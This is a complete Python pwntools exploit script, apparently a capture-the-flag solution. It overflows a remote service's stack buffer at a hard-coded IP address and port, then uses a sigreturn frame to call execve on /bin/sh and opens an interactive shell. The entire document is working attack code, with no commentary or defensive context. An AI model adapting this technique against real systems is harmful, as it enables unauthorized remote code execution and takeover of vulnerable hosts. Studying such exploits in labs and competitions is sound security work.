from pwn import *

context.arch = 'amd64'

host = '5.101.72.234'
port = 33074

execve_syscall_num = 59
bin_sh_addr = 0x402000
syscall = 0x40100B
sigret = 0x401004

if __name__ == "__main__":

	#p = process( "./main" )
	p = remote( host, port )

	paylaod  = 'a' * 72
	paylaod += p64( sigret )
	
	sigFrame = SigreturnFrame( kernel = "amd64" )
	sigFrame.rax = execve_syscall_num
	sigFrame.rdi = bin_sh_addr
	sigFrame.rsi = 0
	sigFrame.rdx = 0
	sigFrame.rip = syscall
	
	paylaod += str( sigFrame ) 

	p.send( paylaod + "\n" )

	p.interactive()
